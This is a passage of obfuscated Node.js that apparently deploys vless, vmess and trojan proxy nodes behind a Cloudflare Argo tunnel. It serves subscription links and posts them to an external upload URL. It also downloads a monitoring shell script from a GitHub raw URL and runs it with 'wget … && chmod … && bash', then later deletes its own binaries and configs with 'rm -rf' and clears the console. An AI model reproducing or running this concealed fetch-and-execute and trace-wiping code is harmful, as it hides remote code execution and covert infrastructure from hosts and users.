_0xcd6fad(_0x138393){const _0x3f19a4=await getMetaInfo(),_0xec3644=NAME?NAME+'-'+_0x3f19a4:_0x3f19a4;return new Promise(_0x25aebd=>{setTimeout(()=>{const _0x7bdf69=_0x29a1,_0x40938e={'v':'2','ps':''+_0xec3644,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x7bdf69(0x1d0),'host':_0x138393,'path':'/vmess-arg'+_0x7bdf69(0x1c7),'tls':_0x7bdf69(0x1ea),'sni':_0x138393,'alpn':'','fp':_0x7bdf69(0x1e1)},_0x64d43e=_0x7bdf69(0x1b9)+UUID+'@'+CFIP+':'+CFPORT+('?encryptio'+'n=none&sec'+'urity=tls&'+'sni=')+_0x138393+(_0x7bdf69(0x181)+'x&type=ws&'+_0x7bdf69(0x15c))+_0x138393+(_0x7bdf69(0x1dc)+'less-argo%'+'3Fed%3D256'+'0#')+_0xec3644+('\x0a\x20\x20\x0avmess:'+'//')+Buffer['from'](JSON['stringify'](_0x40938e))['toString'](_0x7bdf69(0x1b2))+('\x0a\x20\x20\x0atrojan'+_0x7bdf69(0x1c0))+UUID+'@'+CFIP+':'+CFPORT+(_0x7bdf69(0x1a2)+'tls&sni=')+_0x138393+(_0x7bdf69(0x181)+'x&type=ws&'+_0x7bdf69(0x15c))+_0x138393+(_0x7bdf69(0x114)+'rojan-argo'+'%3Fed%3D25'+_0x7bdf69(0x142))+_0xec3644+_0x7bdf69(0x102);console[_0x7bdf69(0x1a9)](Buffer[_0x7bdf69(0x1cc)](_0x64d43e)['toString']('base64')),fs[_0x7bdf69(0x193)+_0x7bdf69(0x128)](subPath,Buffer['from'](_0x64d43e)['toString'](_0x7bdf69(0x1b2))),console[_0x7bdf69(0x1a9)](FILE_PATH+(_0x7bdf69(0x1e2)+'aved\x20succe'+_0x7bdf69(0x160))),uploadNodes(),app['get']('/'+SUB_PATH,(_0x30cf73,_0x19b081)=>{const _0x7d1455=_0x7bdf69,_0x2390ec=Buffer['from'](_0x64d43e)['toString']('base64');_0x19b081['set']('Content-Ty'+'pe','text/plain'+';\x20charset='+'utf-8'),_0x19b081[_0x7d1455(0x199)](_0x2390ec);}),_0x25aebd(_0x64d43e);},0x7d0);});}}async function uploadNodes(){const _0xafba6d=_0x5ae12a;if(UPLOAD_URL&&PROJECT_URL){const _0x324392=PROJECT_URL+'/'+SUB_PATH,_0x40a1c0={'subscription':[_0x324392]};try{const _0x34c09c=await axios['post'](UPLOAD_URL+(_0xafba6d(0x1ab)+_0xafba6d(0x157)+'ns'),_0x40a1c0,{'headers':{'Content-Type':_0xafba6d(0x173)+_0xafba6d(0x195)}});return _0x34c09c&&_0x34c09c['status']===0xc8?(console['log'](_0xafba6d(0x15f)+'on\x20uploade'+_0xafba6d(0x201)+_0xafba6d(0x106)),_0x34c09c):null;}catch(_0x360b93){if(_0x360b93['response']){if(_0x360b93['response'][_0xafba6d(0x135)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x335ffc=fs['readFileSy'+'nc'](listPath,'utf-8'),_0x35ede8=_0x335ffc[_0xafba6d(0x1f3)]('\x0a')[_0xafba6d(0x12f)](_0x5a7aa7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x5a7aa7));if(_0x35ede8['length']===0x0)return;const _0x490e5c=JSON['stringify']({'nodes':_0x35ede8});try{const _0x2d1607=await axios['post'](UPLOAD_URL+('/api/add-n'+_0xafba6d(0x13e)),_0x490e5c,{'headers':{'Content-Type':'applicatio'+_0xafba6d(0x195)}});return _0x2d1607&&_0x2d1607[_0xafba6d(0x135)]===0xc8?(console['log'](_0xafba6d(0x1fb)+_0xafba6d(0x155)+'ssfully'),_0x2d1607):null;}catch(_0x2d52fb){return null;}}else return;}}async function downloadAndRunMonitorScript(){const _0x2dee01=_0x5ae12a;try{console['log']('Starting\x20t'+'o\x20download'+'\x20monitorin'+_0x2dee01(0x1f0)+'.'),await new Promise((_0x1d7631,_0x2de557)=>{const _0xc4d1e1=_0x2dee01;downloadFile(monitorScriptPath,'https://ra'+_0xc4d1e1(0x1aa)+_0xc4d1e1(0xfb)+'com/kadida'+_0xc4d1e1(0x144)+'-monitor/m'+_0xc4d1e1(0x116)+'-monitor.s'+'h',_0x105db5=>{const _0x462f87=_0xc4d1e1;_0x105db5?(console[_0x462f87(0x124)](_0x462f87(0x1f2)+_0x462f87(0x143)+'onitor\x20scr'+'ipt:\x20'+_0x105db5),_0x2de557(_0x105db5)):(console['log'](_0x462f87(0x1da)+_0x462f87(0x197)+'oaded\x20succ'+_0x462f87(0x186)),_0x1d7631());});}),fs['chmodSync'](monitorScriptPath,'755'),console[_0x2dee01(0x1a9)](_0x2dee01(0x1da)+'ript\x20permi'+'ssions\x20set'+'\x20to\x20755'),console[_0x2dee01(0x1a9)](_0x2dee01(0x1d5)+'nitor\x20scri'+_0x2dee01(0x183)+'ent\x20direct'+'ory...');const _0x2d4aaa=_0x2dee01(0x1f5)+FILE_PATH+(_0x2dee01(0x1db)+'\x20+x\x20cf-vps'+_0x2dee01(0x10d)+'h\x20&&\x20./cf-'+'vps-monito'+'r.sh\x20-i\x20-k'+'\x20\x22')+MONITOR_KEY+'\x22\x20-s\x20\x22'+MONITOR_SERVER+_0x2dee01(0x14b)+MONITOR_UPTIME_URL+'\x22';console[_0x2dee01(0x1a9)]('Executing\x20'+_0x2dee01(0x1ef),_0x2d4aaa);const {stdout:_0x8efbaa,stderr:_0x5f3b41}=await exec(_0x2d4aaa);_0x8efbaa&&console['log']('Monitor\x20sc'+'ript\x20outpu'+'t:',_0x8efbaa),_0x5f3b41&&console[_0x2dee01(0x124)](_0x2dee01(0x1da)+'ript\x20stder'+'r:',_0x5f3b41),console['log']('Monitor\x20sc'+'ript\x20execu'+'ted\x20succes'+'sfully');}catch(_0x4c5b5d){console['error']('Error\x20in\x20d'+'ownloadAnd'+'RunMonitor'+'Script:',_0x4c5b5d['message']);try{console['log']('Trying\x20alt'+'ernative\x20m'+'ethod\x20to\x20r'+_0x2dee01(0x189)+_0x2dee01(0x17d));const _0x25edb1=_0x2dee01(0x1f5)+FILE_PATH+('\x22\x20&&\x20wget\x20'+_0x2dee01(0x17a)+'/raw.githu'+'buserconte'+_0x2dee01(0x129)+'idalax/cf-'+'vps-monito'+'r/main/cf-'+'vps-monito'+'r.sh\x20-O\x20cf'+_0x2dee01(0x117)+'or.sh\x20&&\x20c'+_0x2dee01(0x1d1)+_0x2dee01(0x117)+'or.sh\x20&&\x20b'+'ash\x20cf-vps'+'-monitor.s'+_0x2dee01(0x141))+MONITOR_KEY+'\x22\x20-s\x20\x22'+MONITOR_SERVER+'\x22\x20-u\x20\x22'+MONITOR_UPTIME_URL+'\x22';await exec(_0x25edb1),console['log']('Monitor\x20sc'+'ript\x20execu'+_0x2dee01(0x101)+_0x2dee01(0x15a)+'method');}catch(_0x593778){console['error']('Alternativ'+_0x2dee01(0x1cf)+_0x2dee01(0x12d)+':',_0x593778[_0x2dee01(0x178)]);}}}function cleanFiles(){setTimeout(()=>{const _0x4dabc5=_0x29a1,_0x59a4e9=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x59a4e9['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x59a4e9[_0x4dabc5(0x11c)](phpPath);process[_0x4dabc5(0x100)]===_0x4dabc5(0x112)?exec('del\x20/f\x20/q\x20'+_0x59a4e9['join']('\x20')+('\x20>\x20nul\x202>&'+'1'),_0x1db209=>{const _0x1df1de=_0x4dabc5;console['clear'](),console[_0x1df1de(0x1a9)]('App\x20is\x20run'+_0x1df1de(0x10e)),console['log']('Thank\x20you\x20'+_0x1df1de(0x11f)+_0x1df1de(0x1ae)+'t,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x59a4e9['join']('\x20')+('\x20>/dev/nul'+'l\x202>&1'),_0x57dcb8=>{const _0xff8ac1=_0x4dabc5;console[_0xff8ac1(0x19f)](),console[_0xff8ac1(0x1a9)]('App\x20is\x20run'+'ning'),console['log']('Thank\x20you\x20'+'for\x20using\x20'+'this\x20scrip'+_0xff8ac1(0x121));});},0x15f90);}function _0x29a1(_0x50f19d,_0x38807a){const _0x419cd1=_0x1c02();return _0x29a1=function(_0x164012,_0x5b6d24){_0x164012=_0x164012-0xfb;let _0x1c02ed=_0x419cd1[_0x164012];return _0x1c02ed;},_0x29a1(_0x50f19d,_0x38807a);}cleanFiles();async function AddVisitTask(){const _0x3ae7d5=_0x5ae12a;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3ae7d5(0x1a9)]('Skipping\x20a'+'dding\x20auto'+_0x3ae7d5(0x1d8)+'ss\x20task');return;}try{const _0x2cd13d=await axios['post']('https://oo'+_0x3ae7d5(0x154)+'net/add-ur'+'l',{'url':PROJECT_URL},{'headers':{'Content-Type':'applicatio'+'n/json'}});return console['log'](_0x3ae7d5(0x202)+'access\x20tas'+_0x3ae7d5(0x1b1)+'ccessfully'),_0x2cd13d;}catch(_0x54294f){return console['error'](_0x3ae7d5(0x115)+_0x3ae7d5(0x13d)+'\x20task\x20fail'+'d:\x20'+_0x54294f[_0x3ae7d5(0x178)]),null;}}async function startserver(){const _0xc372fd=_0x5ae12a;try{console['log']('Starting\x20s'+'erver\x20init'+'ialization'+'...'),deleteNodes(),cleanupOldFiles(),argoType(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),console['log'](_0xc372fd(0x182)+'\x20VPS\x20monit'+_0xc372fd(0x147)),await downloadAndRunMonitorScript(),await AddVisitTask(),console['log'](_0xc372fd(0x1a7)+_0xc372fd(0x11e)+_0xc372fd(0x1f9)+_0xc372fd(0x201)+'ully');}catch(_0x1a0dbe){console[_0xc372fd(0x124)]('Error\x20in\x20s'+'tartserver'+':',_0x1a0dbe);}}app['listen'](PORT,()=>console['log']('HTTP\x20servi'+_0x5ae12a(0x192)+'ing\x20on\x20int'+_0x5ae12a(0x166)+':'+PORT+'!')),startserver()['catch'](_0x1b47cb=>{const _0x24e41b=_0x5ae12a;console[_0x24e41b(0x124)]('Unhandled\x20'+_0x24e41b(0x11a)+_0x24e41b(0x1e6)+':',_0x1b47cb);});
